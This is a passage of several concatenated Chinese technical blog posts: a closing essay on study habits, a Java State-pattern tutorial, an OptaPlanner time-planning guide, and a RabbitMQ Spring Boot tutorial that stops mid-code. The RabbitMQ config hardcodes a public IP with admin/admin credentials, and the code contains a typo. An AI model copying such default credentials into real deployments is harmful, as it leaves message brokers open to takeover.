总之，现在就是没有安排，完全看自己的心情，想看技术的时候，就全心投入，想看书的时候，就去阅读，没有刻意的安排，就看当下自己的喜好。我发现这时候人感觉比较轻松了，虽说时间上来说可能是一样的，但这种方式顺应了自己的心意。也更容易投入。心里所想和行动一致，心舒服了，其他也就顺了。没有套路就是最好的套路。
但有个前提，切换之前不要留疑惑，不然可能会分神，举例说，切换阅读的时候不要在技术上留个bug,不然脑子里都是bug，哪怕当下不解决，解决办法找到也行，总之让自己的心能完全放下当下这个事情，目前就这个level，境界还需要提升。
看到这，可能读者有疑惑了，你这不是跑题了么，难道是个标题党？没见你说那个重要么，真不是，分享这个就是希望大家找到合适提升自己的方式，还原一下自己的心路历程，至于标题说的"技术与认知"哪个重要，对技术人来说真的两个都重要，一个是现在吃饭的家伙，一个是未来的价值基础，你说你要眼下还是未来，(认知的问题，可以看之前写的关于认知的文章)，只是这个权衡在不同阶段有不同的考量，顺意而为，不要用行动欺骗自己的思想。
********************************************************************************************************************************************************************************************************
行为型模式：状态模式


十一大行为型模式之八：状态模式。

简介
姓名 ：状态模式
英文名 ：State Pattern
价值观 ：有啥事让状态我来维护
个人介绍 ：
Allow an object to alter its behavior when its internal state changes.The object will appear to change its class.
当一个对象内在状态改变时允许其改变行为，这个对象看起来像改变了其类。
（来自《设计模式之禅》）
你要的故事
现在有好多个人贷款软件，比如：支付宝、360借条(打广告。。。)等等。贷款会有一个用户状态流程，游客->注册用户->授信用户->借款用户(这里简化了状态，只用 4 个)。每个状态拥有的权限不一样，如下图所示。

从上图可以看到，一个用户有 3 种行为，分别是注册、授信、借款。当注册成功后，用户的状态就从『游客』改变为『注册用户』；当授信成功后，用户的状态就从『注册用户』改变为『授信用户』；当借款成功后，用户的状态就从『授信用户』改变为『借款用户』。现在我们就来实现用户注册、授信、借款的过程，因为每个状态的权限不一样，所以这里需要根据用户的状态来限制用户行为。
很快，我们就完成下面的代码。
class User {
    private String state;

    public String getState() {
        return state;
    }

    public void setState(String state) {
        this.state = state;
    }

    public void register() {
        if ("none".equals(state)) {
            System.out.println("游客。注册中。。。");
        }else if ("register".equals(state)) {
            System.out.println("注册用户。不需要再注册。");
        } else if ("apply".equals(state)) {
            System.out.println("授信用户。不需要再注册。");
        } else if ("draw".equals(state)) {
            System.out.println("借款用户。不需要再注册。");
        }
    }

    public void apply() {
        if ("none".equals(state)) {
            System.out.println("游客。不能申请授信。");
        }else if ("register".equals(state)) {
            System.out.println("注册用户。授信申请中。。。");
        } else if ("apply".equals(state)) {
            System.out.println("授信用户。不需要再授信。");
        } else if ("draw".equals(state)) {
            System.out.println("借款用户。不需要再授信。");
        }
    }

    public void draw(double money) {
        if ("none".equals(state)) {
            System.out.println("游客。申请借款【" + money + "】元。不能申请借款。");
        } else if ("register".equals(state)) {
            System.out.println("注册用户。申请借款【" + money + "】元。还没授信，不能借款。");
        } else if ("apply".equals(state)) {
            System.out.println("授信用户。申请借款【" + money + "】元。申请借款中。。。");
        } else if ("draw".equals(state)) {
            System.out.println("授信用户。申请借款【" + money + "】元。申请借款中。。。");
        }
    }
}

public class NoStateTest {

    public static void main(String[] args) {
        User user = new User();
        user.setState("register");
        user.draw(1000);
    }

}

打印结果：
注册用户。申请借款【1000.0】元。还没授信，不能借款。
上面代码实现了用户 register (注册)，apply (授信)，draw (借款) 这 3 种行为，每个行为都会根据状态 state 来做权限控制。看起来有点繁琐，扩展性不高，假设新增了一个状态，那么注册、授信、借款这 3 种行为的代码都要修改。下面通过状态模式来解决这个问题。
我们把状态给抽出来，作为一个接口，因为在每种状态中都可能有注册、授信、借款行为，所以把这 3 个行为作为状态接口的方法，让每个状态子类都实现相应的行为控制。如下代码所示。
interface State {

    void register();

    void apply();

    void draw(double money);
}

/**
 * 游客
 */
class NoneState implements State {

    @Override
    public void register() {
        System.out.println("游客。注册中。。。");
    }

    @Override
    public void apply() {
        System.out.println("游客。不能申请授信。");
    }

    @Override
    public void draw(double money) {
        System.out.println("游客。申请借款【" + money + "】元。不能申请借款。");
    }
}

/**
 * 注册状态
 */
class RegisterState implements State {

    @Override
    public void register() {
        System.out.println("注册用户。不需要再注册。");
    }

    @Override
    public void apply() {
        System.out.println("注册用户。授信申请中。。。");
    }

    @Override
    public void draw(double money) {
        System.out.println("注册用户。申请借款【" + money + "】元。还没授信，不能借款。");
    }
}

/**
 * 授信状态
 */
class ApplyState implements State {

    @Override
    public void register() {
        System.out.println("授信用户。不需要再注册。");
    }

    @Override
    public void apply() {
        System.out.println("授信用户。不需要再授信。");
    }

    @Override
    public void draw(double money) {
        System.out.println("授信用户。申请借款【" + money + "】元。申请借款中。。。");
    }
}

/**
 * 借款状态
 */
class DrawState implements State {

    @Override
    public void register() {
        System.out.println("借款用户。不需要再注册。");
    }

    @Override
    public void apply() {
        System.out.println("借款用户。不需要再授信。");
    }

    @Override
    public void draw(double money) {
        System.out.println("申请借款【" + money + "】元。申请借款中。。。");
    }
}

class User1 {
    private State state;

    public State getState() {
        return state;
    }

    public void setState(State state) {
        this.state = state;
    }

    public void register() {
        this.state.register();
    }

    public void apply() {
        this.state.apply();
    }

    public void draw(double money) {
        this.state.draw(money);
    }
}

public class StateTest {
    public static void main(String[] args) {
        User1 user1 = new User1();
        user1.setState(new RegisterState());
        user1.apply();
        user1.draw(1000);
        user1.setState(new ApplyState());
        user1.draw(2000);
    }

}


打印结果：
注册用户。授信申请中。。。
注册用户。申请借款【1000.0】元。还没授信，不能借款。
授信用户。申请借款【2000.0】元。申请借款中。。。
看上面代码，我们抽象了 State 接口，4 种状态分别用 NoneState (游客)、RegisterState (注册)、ApplyState (授信)、DrawState (借款) 表示。而每个状态都有 3 种行为，它们各自对这些行为进行权限控制。这样子实现可以让权限逻辑分离开，分散到每个状态里面去，如果以后要业务扩展，要新增状态，那就很方便了，只需要再实现一个状态类就可以，不会影响到其他代码。这也是为什么《阿里巴巴 Java 开发手册》里面讲的，当超过 3 层的 if-else 的逻辑判断代码，推荐用状态模式来重构代码。
总结
状态模式 很好的减低了代码的复杂性，从而提高了系统的可维护性。在业务开发中可以尝试使用，比如在迭代开发中，业务逻辑越来越复杂，从而不得不使用很多 if-else 语句来实现时，就可以考虑一下是不是可以用 状态模式 来重构，特别是一些有状态流程转换方面的业务。看到这篇文章，想想工作中是不是有些复杂的代码可以重构，赶紧行动起来。
推荐阅读：
行为型模式：观察者模式
行为型模式：迭代器模式
行为型模式：策略模式
设计模式系列文章持续更新中，欢迎关注公众号 LieBrother，一起交流学习。

********************************************************************************************************************************************************************************************************
时间规划在Optaplanner上的实现

　　在与诸位交流中，使用较多的生产计划和路线规划场景中，大家最为关注的焦点是关于时间的处理问题。确实，时间这一维度具有一定的特殊性。因为时间是一维的，体现为通过图形表示时，它仅可以通过一条有向直线来表达它的时刻和方向。相对而言，空间则可以存在多维，例如二维坐标，三维空间等，甚至在生产计划的规划场景中，各种资源可以表示为多个维度。因此，时间的一维特性，决定了在规划过程中，需要处理它的方法也具有一定的特殊性和局限性。本文将讨论通过Optaplanner实现规划过程中，对于时间方面的处理方式。


在众多规划优化场景中，可以归纳为两种情况的规划，分别是单一维的空间维度规划，和同时存在空间与时间两个维度进行规划。


 其中第一种情况，仅对一个维度进行规划的场景，我们可以把这一维归纳为，仅对空间维度的规划。例如八王后(N Qeen)问题，其规划的目标是为每个王后找个适当的位置，位置就是一个最为直观的空间概念，因此它是一个很明确直观的空间规划问题。而另外一些从直接字面意义上可能跟空间并没有直接的关系，但其实也可以将它视作仅有一个空间维度的规划。这类规划的一个特点规划目标与目标之间没有时序关系，即时间维度是不考虑的，例如。有一些存在时间概念的问题，其实也可以转化为唯一空间维度的规划，从而将问题简化。例如排班过程中，将每个人员安排到指定的班次，虽然班次是一个时间上概念的概念，但实际对这个问题进行排班设计的时候，我们可以将时间转化为类似空间的形式处理。更直观的说法，将班次分布在时间轴上，按时间轴来看，各个班次就是时间轴上不同位置的区间，从而令问题简化。因此，这类规则更严格地说，可以理解为无论是空间还是时间上的规划，都可以转化、展开为单一唯度的规划问题，通过使用空间规划的方法进行规划建模求解；即使是时间规划（例如排班）也不例外。


 　　另外一种规划，则需要同时考虑空间与时间两个维度协同规划。如生产计划、带时间窗口的车辆路线规划等问题，就是其中的典型。以生产计划为例，在空间维度，需要将一个任务分配到合理的机台，即是空间上的规划。然而，生产计划问题的另一个需求是，确定了机台后，还要确定到底这个任务应该在什么时候开始，什么时候结束；哪个任务需要在哪个任何完成后才能开始等等。这些时序逻辑相关的引出的问题，均属于时间规划问题。时间维度可以与空间维度一起，确定一个活动的时空坐标。此坐标是一个逻辑上抽象的概念。以生产计划为例，两个维度均通过平面图形来表示时，可以把计划中的每个任务，分配在指定机台的指定时间区间上，通过下图可以看到，这个示意图的水平轴（X轴）表示时间，从这个方向可以看出一个任务哪个时刻开始，持续多久，哪个时刻结束。以及与该任务同处于一个空间（机台，或产线，或车间）上的前后任务的接续关系。垂直轴（Y轴）表示空间，表示它被分配到哪个机台上执行。如下图：









 　　针对不同的时间规划要求，Optaplanner提供了3常用的规划模式，分别是时间槽模式- Time Slot Pattern，时间粒模式 - Time Grain Pattern, 和时间链模式 - Chained Through Time Pattern.下面分别对这三种模式的特征，适用场景和使用方法进行详细介绍。因为翻译准确度原因（对自己的英文水平缺乏自信:P), 下文介绍中均直接使用Time Slot, Time Grain 和 Chained Through Time.以避免本文件的翻译不当造成误解。


 

时间槽模式 - Time slot

 Time Slot在应用时有一些适用条件,满足以下所有条件，才适用：



规划实体中的规划变量是一个时间区间；


一个规划变量的取值最多仅可分配一个时间区间；


规划变量对应的时间区间是等长的。



 


　　对于规划值范围各个时间段，将其转换为空间上的概念更为直观。将时间用一个水平轴表示，在轴上划分大小固定的区间，这些区间则可以作为规划过程中的取值范围；在设计时，把这些区间定义成ValueRange。适用于Time slot模式情况，有制定中小学课程表、考试安排等问题。因为大学或公开课程的计划安排，除了排定时间外，可能还需要确定具体的地点，也就是空间维度的规划。此类问题通常需要将时间和空间分开来考虑，但其中的时间纬可以通过Time slot模式转化为与空间规划一样的问题，从而令问题简化。引用Optaplanner开发手册的一张图可以清楚地看到，每一个规划实体只需要一个时间区间，且区间长短是相同的，(如下图）。










 

  　　从图中可以看出，每门课所需的时间都是固定一小时。具体到这个模式的应用,因为其原理、结构和实现起来都相当简单，本文不通过示例详细讲解了。可参考示例包中的Course timetabling中的设计和代码。




 时间粒模式 - Time Grain


 　　在相当多运筹优化场景中，需要规划的时间长短是不固定的，不同的任务其所需的时间有长短之分。这种需求下，若使用Time slot模式就无法实现时间上的精确规划。那些就要使用更灵活，时间粒度更小的Time Grain模式。从Time Grain模式的名称中的Grain可以推测到，此模式是将时间细分成一个一个颗粒并应用于规划。例如可以设定为每1分钟，5分钟，30分钟，1小时等固定的长度，为一个Grain的长度。


Time Grain模式适用条件：



规划变量是时间区间；


业务上对应于规划变量的时间区间可以不等长，但必须是Grain的倍数。



 　　例如通过Outlook的日历功能创建会议时，默认情况下每个会议的时间，是0.5小时的倍数，也就是一个会议至少是0.5小时，或者是1小时，或1.5小时如此类推。当然如果你不使用Outlook的默认时间精度，也可以将时间精度定到分钟，那么也就表示，会议的时间是1分钟的倍数。只不过针对人的日常活动在时间上的精度，以分钟作为精确度其意义不太大。就如9:01分开会跟9:00开会，对于人类的活动能力来说，正常情况下不存在任何区别。因为你从办公室去到会议室，都可能需要花费1分钟了；所以outlook里默认的是半小时。那么这个最小的时候单位 - 半小时，在Time Grain模式中，就被称为一个Time Grain，以下简称Grain。可以先从开发手册的图中看到Time Grain模式所表达的意义，如下图。


 
 　　从上图可以看到，每个会议所需的时间长度是不相等的，但是其长度必然是一个Time Grain的倍数，从图中上方的时间刻度可以比划出一个TimeGrain应该是15分钟。例如Sales meeting占用了4个Time Grain，即时长1小时。Time Grain模式的使用会相对Time Slot更灵活，适用范围会更广。通过设置可知，其实适用于Time Slot模型的情形，是完全可以通过TimeGrain模式实现的，只是实现起来会更复杂一些。那么Time Grain模式的设计要点在哪里呢？要了解其设计原理，就得先掌握Time Grain的结构及其对时间的提供方法。



 　　Time Grain中的重点在于一个Grain的设计，与Time Slot中的slot一样，Time Grain中的Grain表示的也是一个时间区间，只不过它所表达的意义不仅在于一个Time Grain的时间区间内，每个Grain的序号也是关键因素，当一个Grain被分配到一个规划变量时，Grain的序号决定了它与时间轴的映射位置。在生产计划中，若一个Grain被分配到一个任务时，表示任务起止于这个Grain的开始时刻。 即该任务的开始时间是哪个Grain内对应的时间区间内，那么这个Grain的开始时间，就是这个任务的开始时间；通过这个任务的长度，推算出它需要占用多少个Grain, 进而推算出它的结束时间会在哪个Grain内，那么这个Grain的结束时间，即是这个任务的结束时间。


还是以上图为例，其中的Sales meeting,它的起始是在grain0内，grain0的起始时间是8:00，那么这个会议的起始时间就是8:00。这个会议的长度是1小时，所以它占用了4个Grain,因此，第4个Grain的结束时间就是会议的结束时间，也就是图中Grain3的结束时间 - 9:00，是这个会议的结束时间。进一步分析也知，若这个会议时长是1:10, 那么它的结束时间将会落于gran4内（第5个grain), 那么它的结束时间就是grain4的结束时间 - 9:15. 因此，总结起来，我们在实现这个模式的时候有以下要点在设计时需要注意：



设计好每个Grain的粒度，也就是时间长度。并不是粒度越细越好，例如以1秒钟作为一个粒度，是不是就可以将任务的时间精度控制在1级呢？理论上是可以的，但日常使用中不太可行。因为这样的设计会产生过量的Grain,Grain就是Value Range，当可选值的数量过多时，整个规划问题的规模就会增大，其时间复杂度就会指数级上升，从而令优化效果降低。


定义好每个Grain与绝对时间的映射关系。这个模式中的Time Grain其时间上是相对的。如何理解呢？就是说，这个模式在运行的时候，会把初始化出来的Grain对象列表，以Index（Grain的序号）为序形成一个连接的时间粒的序列。列表中每一个具体的Grain对应的绝对时间是什么时候呢？是以第一个Grain作为参照推算出来的。例如上图中的第一个Grain - grain0它的起始时间是8:00, 那么第6个grain - grain5的起始时间就是9:30，这个时间是通过grain0加上6个grain的时长推算出来的，也就是8:00加上1.5小时，因此得到的是9:30。因此，当你设定Time Grain与绝对时间的对应关系时，就需要从业务上考虑，grain0的起始是什么时刻；它决定了后续所有任务的时间。



　　为了防止同一空间上，存两个任务时间重叠的问题，可以根据其分配的Grain进行判断。如示例Meeting scheduling中关于时间重叠的判断，可以参考MeetingAssignment类中的calculateOverlap方法，见以下代码。


 

public int calculateOverlap(MeetingAssignment other) {
　　if (startingTimeGrain == null || other.getStartingTimeGrain() == null) {
　　　　return 0;
　　}
　　int start = startingTimeGrain.getGrainIndex();
　　int end = start + meeting.getDurationInGrains();
　　int otherStart = other.startingTimeGrain.getGrainIndex();
　　int otherEnd = otherStart + other.meeting.getDurationInGrains();
 
　　if (end < otherStart) {
　　　　return 0;
　　} else if (otherEnd < start) {
　　　　return 0;
　　}
　　return Math.min(end, otherEnd) - Math.max(start, otherStart);
}




 


　　上述代码是判断两个会议的TIme Grain, 若存在重叠，则返回重叠量，供引擎的评分机制来判断各个solution的优劣。


 


时间链模式 - Chained Through Time


 　　前面提出的两种时间模式，其实有较多的相似之处，都是将时间段划分为单个个体，再将这些个体作为规划变量的取值范围，从而实现与空间规划一致的规划模式。但更复杂的场景下，将时间转化为“空间”的做法，未必能行得通。例如带时间窗口的路径规划，多工序多资源生产计划等问题，其时间维度是难以通过Time Slot或Time Grain模式实现的。我增尝试将Time Grain模式应用于多工序多资源条件下的生产计划规划；其原理上是可行的，但仍然会到到一些相当难解决的问题。其中之一就是Time Grain的粒度大小问题，若需要实现精确到分钟的计划，当编排一个时间跨度较大的计划时，就会引起问题规模过大的问题，从而论引擎效率骤降。另外就是实现相邻任务的重叠和先后次序判断时，会遇到一些难以解决的，问题需要花费较多的精力去处理。因此，Optaplanner引入了第三种时间规划模式 - 时间链模式（同样是翻译问题，下称Chained Through Time模式)。


 Chained Through Time模式顾名思义就是应用了链状结构的特性，来实现时间的规划。它的设计思想是，规划变量并不是普通的时间或空间上的值, 而是另外一个规划实体；从而形成一个由各个首尾相接的规划实体链，即Value Range的范围就是规划实集合本身。通过规划实体间的链状关系，来推算各个实体的起止时间。事实上，Optaplanner中将规划实体环环相扣形成链的特性，其主要目的并非为了实现时间规划，而是为了解类似TSP，VRP等问题而提供的。这些问题需要规划的，是各个节点之间形成的连通关系；在约定规则下，求解最佳连通方案。根据不同的场景要求，所求的目标有“最短路径”，“最小重复节点”，“最在连接效率”等。在时间规划的功能方面，其实现方式与上两种模式类似。以生产计划的例子来说，通过Chained Through Time模式获得各任务的连接关系与次序后，就可以根据链中首个任务的开始时间，结合各任务的持续时间，推算出各个任务精确的起止时间了，甚至可以精确到秒。所以此模式用于时间规划，只是它的一个“副业”，引擎使用Chained Through Time模式时，并不是直接对时间进行规划优化，而是在优化规划实体之间的连接关系；时间作为这个规划实体中的一个影子变量（Shadow variable）进行计算，最终通过评分机制对这个影子变量进行约束限制，从而得到时间优化的方案。与Time Slot和Time Grain相比，Chained Through Time最大的特性是通过次序来推导时间，而另外两种模式则是需要通过时间来反映任务之间的先后关系。


 　　虽然Chained Through Time模式的作用相当巨大且广泛，但该模式的设计与实现难度又是三个模式中最高的，实现起来相对复杂。下面来进一步对其进行深入讨论。


 


Chained Through Time模式的意义


　　Chained Through Time模式通过对正在进行规划的所有规划实体建立链状关系，来实现时间推导，其推导结果示意图如下。从图中可以看到，分配给Ann有两个任务(FR taxes和SP taxes),其中第一个任务FR taxes的开始时刻是固定为本次计划的最早时间，而第二个任务SP taxes的开始时刻，则是根据第一个任务推导出来的 - 等于第一个任务的开始时刻加上其持续时间。因此，需要在约束的限制下，引擎过过各种约束分数的判断，生成一个相对最合理的实体连接方案，再在这个方案的基础上来推导时间，或将时间纳入作为约束条件，实现对连接方案的影响，从而实现了时间维度的规划优化。


 




 




 Chained Through Time的内存模型
　　规划实体形成的链是由引擎自动生成的，每生成的一个方案都是由各规划实体之间的相对位置变化而成的。在创建的这些规划实体构成的链中，它会遵循以下原则：



一条链由一个Anchor(锚),和零或，或1个，或多个Entity(实体，其实就是规划实体)构成；


一条链必须有且仅有一个Anchor(锚）；


一条链中的Entity或Anchor之间是一对一的关系，不可出现合流或分流结构；


一条链中的Entity或Anchor不可出现循环。



如下图


 
Chained Through Time模式的设计实现



 　　通过上面的链结构，我们了解到，一条链中将会存在两种对象，一种是Anchor, 一种是Entity.对么它们分别代表现实场景中的什么业务实体呢？其实Entity是其常容易理解，如果是生产计划案例中，它代表的是每个任务；在车辆路线规划案例中，它代表的是每个车辆需要途径的派件/揽件客户。而Anchor则表未任务所在的机台，及各个投/揽方案中的每一车辆。因此，这两种不同的对象，在内容中会形成依赖关系，即一个Entity的前一步可以是另外一个Entiy, 也可以是一个Anchor。以生产计划的业务场景来描述，则表示一个任务的前一个任务，可以是另外一个任务(Entity)，也可以是一个机台(Anchor,当这个任务是这个机台的首个任务时）。因此，在我们设计它的时候需要把这两种不同的业务实体抽象为同一类才有办法实现它们之间的依赖,事实上这种抽象关系，在面向对象的原则，在业务意义上来说，是不成立的，仅仅是为了满足它们形成同一链的要求才作出的计划。如下是一个任务与机台的类设计图。可以看到，我从Taskg与Machine抽象了一个父类Step（这是我想到的最合适类名了）,那么每一个任务的前一个Step有可能是另外一个任务，也有可能是一个机台。

 
时间推算方法
　　Chained Through Time模式与其两种时间规划模式不同，本质上它并不对时间进行规划，只对实体之间的关系进行规划优化。因此，在引擎每一个原子操作中需要通过对VariableListener接口的实现，来对时间进行推算，并在完成推算后，由引擎通过评分机制进行约束评分。一个Move有可能对应多个原子操作，一个Move的操作种类，可以参见开发 手册中关于Move Selector一章，在以后对引擎行为进行深入分析的文章中，我将会写一篇关于Move Seletor的文件，来揭示引擎的运行原理。在需要进行时间推算时，可以通过实现接口的afterVariableChanged方法，对当前所处理的规划实体的时间进行更新。因为Chained Through Timea模式下，所有已初始化的规划实体都处在一条链上；因此，当一个规划实体的时间被更新后，跟随着它的后一个规划实体的时间也需要被更新，如此类推，直到链上最后一个实体，或出现一个时间正好不需要更新的规划实体，即该规划实体前面的所有实体的时间出现更新后，其时间不用变化，那么链上从它往后的规划实体的时候也无需更新。
　　以下是VariableListener接口的afterVariableChanged及其处理方法。

// 实现VariableListener的类
public class StartTimeUpdatingVariableListener implements VariableListener<Task> {

    // 实现afterVariableChanged方法
    @Override
    public void afterVariableChanged(ScoreDirector scoreDirector, Task task) {
        updateStartTime(scoreDirector, task);
    }

    @Override
    public void beforeEntityAdded(ScoreDirector scoreDirector, Task task) {
        // Do nothing
    }

    @Override
    public void afterEntityAdded(ScoreDirector scoreDirector, Task task) {
        updateStartTime(scoreDirector, task);
    }
    .
    .
    .
}    

 

//当一个任务的时候被更新时，顺着链将它后面所有任务的时候都更新
protected void updateStartTime(ScoreDirector scoreDirector, Task sourceTask) {
     Step previous = sourceTask.getPreviousStep();
     Task shadowTask = sourceTask;
     Integer previousEndTime = (previous == null ? null : previous.getEndTime());
     Integer startTime = calculateStartTime(shadowTask, previousEndTime);
     while (shadowTask != null && !Objects.equals(shadowTask.getStartTime(), startTime)) {
          scoreDirector.beforeVariableChanged(shadowTask, "startTime");
          shadowTask.setStartTime(startTime);
          scoreDirector.afterVariableChanged(shadowTask, "startTime");
          previousEndTime = shadowTask.getEndTime();
          shadowTask = shadowTask.getNextTask();
          startTime = calculateStartTime(shadowTask, previousEndTime); 
     }
}

 
规划实体的设计
　　上一步我们介绍了如何通过链在引擎的运行过程中进行时间推算，那么如何设定才能让引擎可以执行VariableListener中的方法呢，这就需要在规划实体的设计过程中，反映出Chained Through Time的特性了。我们以上面的类图为例，理解下面其设计要求，在此示例中，把Task作为规划实体(Planning Entity), 那么在Task类中需要定义一个Planning Variable(genuine planning variable), 它的类型是Step,它表示当前Task的上一个步骤（可能是另一个Task，也可能是一Machine). 此外，在 @PlanningVariable注解中，添加graphType = PlanningVariableGraphType.CHAINED说明。如下代码：

// Planning variables: changes during planning, between score calculations.
    @PlanningVariable(valueRangeProviderRefs = {"machineRange", "taskRange"},
            graphType = PlanningVariableGraphType.CHAINED)
    private Step previousStep;

　　以上代码说明，规划实体(Task)的genuine planning variable名为previousStep, 它的Value Range有两个来源，分别是机台列表（machineRange)和任务列表(taskRange),并且添加了属性grapType=planningVariableGraphType.CHAINED, 表明将应用Chained Through Time模式运行。
　　有了genuine planning variable, 还需要Shadow variable, 所谓的Shadow variable，在Chained Through Time模式下有两种作用，分别是：
　　1. 用于建立两个对象（Entity或Anchor)之间的又向依赖关系；即示例中的Machine与Task, 相信的两个Task。
　　2. 用于指定当genuine planning variable的值在规划运算过程产生变化时，需要更改哪个变量；即上面提到的开始时间。
，对于第一个作用，其代码体现如下，在规划实体（Task)中，以@AnchorShadowVariable注解，并在该注解的sourceVariableName中指定该Shadow Variable在链上的前一个对象指向的是哪个变量。

    // Shadow variables
    // Task nextTask inherited from superclass
    @AnchorShadowVariable(sourceVariableName = "previousStep")
    private Machine machine;

　　上述代码说明成员machine是一个Anchor Shadow Variable, 在链上，它连接的前一个实体是实体类的一个成员 - previousStep.
　　Chained Through Time中的链需要形成双向关系(bi-directional)，下图是路线规划示例中。一个客户与上一个停靠点之间的又向关系。

　　　在规划实体(Task)中我们已经定义了前一个Step，并以@AnchorShadowVariable注解标识。而双向关系中的另一方，则需要在相邻节点中的前一个节点定义。通过链的内存模型，我们可以知道，在生产计划示例中，一个实体的前一个节点的类型可能是另一个Task, 也要能是一个Machine, 因此，前一个节点指向后一个节点的规划变量，只能在Task与Machine的共同父类中定义，也就是需要在Step中实现。因此，在Step类中需要定义另一个Shadow Variable, 因为相对于Task中的Anchor Shadow variable, 它是反现的，因此，它需要通过@InverseRelationShadowVariable注解，说明它在链上起到反向连接作用，即它是指向后一个节点的。代码如下：

@PlanningEntity
public abstract class TaskOrEmployee {

    // Shadow variables
    @InverseRelationShadowVariable(sourceVariableName = "previousTaskOrEmployee")
    protected Task nextTask;
    .
    .
    .
}

　　可以从代码中看到，Step类也是一个规划实体.其中的一个成员nextTask, 它的类型是Task,它表示在链中指向后面的Entity. 大家可以想一下，为什么它可以是一个Task, 而无需是一个Step。
　　通过上述设计，已经实现了Chained Through Time的基本模式，可能大家还会问，上面我们实现了VariableListener, 引擎是如何触发它的呢。这就需要用到另外一种Shadow Variable了，这种Shadow Varible是用于实现在运算过程中执行额外处理的，因此称为Custom Shadow Variable.

// 自定义Shadow Variable, 它表示当 genuine被引擎改变时，需要处理哪个变量。 
@CustomShadowVariable(variableListenerClass = StartTimeUpdatingVariableListener.class,
            sources = {@PlanningVariableReference(variableName = "previousStep")})
    private Integer startTime; // 因为时间在规划过程中以相对值进行运算，因此以整数表示。

　　上面的代码通过@CustomShadowVariable注解，说明了Task的成员startTime是一个自定义的Shadow Variable. 同时在注解中添加了variableListenerClass属性，其值指定为刚才我们定义的，实现了VariableListener接口的类 - StartTimeUpdatingVariableListener，同时，能冠军sources属性指定，当前Custom Shadow Variable是跟随着genuine variable - previousStep的变化而变化的。
　　至此，关于Chained Through Time中的关键要点已全部设计实现，具体的使用可以参照示例包中有用到此模式的代码。
 
总结
　　关于时间的规划，在实际的系统开发时，无不止本文描述的那么简单。有许许多多的个性规则和要求，需要通过大家的技巧来实现；但万变不离其宗，所有处理特殊情况的技巧，都需要甚至Optaplanner这些既有特性。因此，大家可以先通过示例包中的代码将这些特性掌握，再进行更复杂情况下的设计开如。未来若时间允许，我将分享我在项目中遇到的一些特殊，甚至是苛刻的规则要求，及其处理办法。
 
如需了解更多关于Optaplanner的应用，请发电邮致：kentbill@gmail.com或到讨论组发表你的意见：https://groups.google.com/forum/#!forum/optaplanner-cn若有需要可添加本人微信（13631823503）或QQ(12977379)实时沟通，但因本人日常工作繁忙，通过微信,QQ等工具可能无法深入沟通，较复杂的问题，建议以邮件或讨论组方式提出。(讨论组属于google邮件列表，国内网络可能较难访问，需自行解决)

********************************************************************************************************************************************************************************************************
rabbitmq学习（七） —— springboot下的可靠使用
前面的学习都是基于原生的api，下面我们使用spingboot来整合rabbitmq
springboot对rabbitmq提供了友好支持，极大的简化了开发流程
引入maven


<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-amqp</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-test</artifactId>
    <scope>test</scope>
</dependency>

配置yml


rabbitmq:
    host: 47.102.103.232
    port: 5672
    username: admin
    password: admin
    virtual-host: /test
    publisher-confirms: true
    publisher-returns: true
    cache:
      channel:
        size: 10
    listener:
      simple:
        acknowledge-mode: manual
        concurrency: 1
        max-concurrency: 3
        retry:
          enabled: true

这是基础的配置，看不懂的配置后面会介绍
更详细的配置参考官方https://docs.spring.io/spring-boot/docs/2.1.3.RELEASE/reference/htmlsingle/#boot-features-rabbitmq（搜索rabbit往下拉即可）
代码实现

 配置类

@Configuration
public class RabbitConfig {
    @Bean
    public Queue helloQueue() {
        return new Queue("helloQueue");
    }　　 //创建topic交换机
    @Bean
    public TopicExchange helloExchange() {
        return new TopicExchange("helloExchange");
    }
    @Bean
    public Binding bindingPaymentExchange(Queue helloQueue, TopicExchange helloExchange) {
        return BindingBuilder.bind(helloQueue).to(helloExchange).with("hello.#");
    }
    /**
     * 定制化amqp模版　　　* connectionFactory:包含了yml文件配置参数
     */
    @Bean
    public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory) {
        RabbitTemplate rabbitTemplate = new RabbitTemplate(connectionFactory);
        // 必须设置为 true，不然当 发送到交换器成功，但是没有匹配的队列，不会触发 ReturnCallback 回调
        // 而且 ReturnCallback 比 ConfirmCallback 先回调，意思就是 ReturnCallback 执行完了才会执行 ConfirmCallback
        rabbitTemplate.setMandatory(true);
        // 设置 ConfirmCallback 回调   yml需要配置 publisher-confirms: true
        rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -> {
　　　　　　　// 如果发送到交换器都没有成功（比如说删除了交换器），ack 返回值为 false
            // 如果发送到交换器成功，但是没有匹配的队列（比如说取消了绑定），ack 返回值为还是 true （这是一个坑，需要注意）
            if (ack) {
                String messageId = correlationData.getId();
                System.out.println("confirm:"+messageId);
            }
        });
        // 设置 ReturnCallback 回调   yml需要配置 publisher-returns: true
        // 如果发送到交换器成功，但是没有匹配的队列，就会触发这个回调
        rabbitTemplate.setReturnCallback((message, replyCode, replyText,
                                          exchange, routingKey) -> {
            String messageId = message.getMessageProperties().getMessageId();
            System.out.println("return:"+messageId);
        });
        return rabbitTemplate;
    }
}

回调机制

消息不管是否投递到交换机都进行ConfirmCallback回调，投递成功ack=true，否则为false
交换机匹配到队列成功则不进行ReturnCallback回调，否则先进行ReturnCallback回调再进行ConfirmCallback回调
如果消息成功投递到交换机，但没匹配到队列，则ConfirmCallback回调ack仍为true

生产者

@Component
public class RbProducer {
    //注意一定要使用RabbitTemplate！！
    //虽然RabbitTemplate实现了AmqpTemplate 但是AmqpTemplate里并没有能发送correlationData的方法
    @Resource
    private RabbitTemplate rbtemplate;
    public void send1(String msg){
        //CorrelationData用于confirm机制里的回调确认
        CorrelationData correlationData = new CorrelationData(UUID.randomUUID().toString());
        rbtemplate.convertAndSend("helloExchange", "hello.yj", msg,correlationData);
    }
    public void send2(User user){
        CorrelationData correlationData = new CorrelationData(UUID.randomUUID().toString());
        rbtemplate.convertAndSend("helloExchange", "hello.yj", user,correlationData);
    }
}

消费者

@Component
@RabbitListener(queues = "helloQueue")
public class RbConsumer {
    @RabbitLister(queues = "helloQueue")
    public void receive0(Message msg,  Channel channel) throws IOException {
        System.out.println("consumer receive message0: " + msg);
        channel.basicAck(msg.getMessageProperties().getDeliveryTag(), false);
    }
    @RabbitHandler
    public void receive1(String msg, @Header(AmqpHeaders.DELIVERY_TAG)long deliveryTag, Channel channel) throws IOException {
        System.out.println("consumer receive message1: " + msg);
